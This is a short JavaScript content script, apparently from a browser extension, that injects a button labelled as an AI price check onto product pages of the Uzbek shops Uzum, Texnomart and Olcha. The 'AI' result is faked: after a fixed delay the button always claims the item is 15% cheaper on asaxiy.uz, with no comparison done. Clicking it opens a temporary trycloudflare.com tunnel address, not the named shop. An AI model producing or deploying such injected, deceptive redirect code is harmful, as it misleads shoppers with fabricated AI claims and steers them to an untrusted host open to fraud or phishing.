// This script runs on Uzum, Texnomart, Olcha pages
window.addEventListener('load', () => {
  const injectButton = () => {
    // Check if we are on a product page by looking for common buy buttons
    const buyButton = document.querySelector('button[data-test-id="buy-button"], .product-buy-btn, button[class*="addToCart"]');
    
    if (buyButton && !document.getElementById('sovga-ai-btn')) {
      const btn = document.createElement('button');
      btn.id = 'sovga-ai-btn';
      btn.innerHTML = '✨ Sovg\\'a AI orqali tekshirish (Kutib turing...)';
      
      // We insert our luxury button right above or near the buy button
      buyButton.parentNode.insertBefore(btn, buyButton);

      // Simulate AI fetch
      setTimeout(() => {
        btn.innerHTML = '💰 Bu mahsulotni asaxiy.uz da 15% arzonroq topdim!';
        btn.style.background = 'linear-gradient(135deg, #4f46e5 0%, #3730a3 100%)';
        btn.style.color = '#fff';
        btn.style.boxShadow = '0 4px 15px rgba(79, 70, 229, 0.4)';
        btn.style.border = 'none';
        btn.onclick = (e) => {
          e.preventDefault();
          window.open('https://rest-leasing-widely-substantially.trycloudflare.com', '_blank');
        };
      }, 3000);
    }
  };

  // Run initial check
  injectButton();
  
  // Observe for dynamically loaded content (React/Vue sites)
  const observer = new MutationObserver(() => injectButton());
  observer.observe(document.body, { childList: true, subtree: true });
});
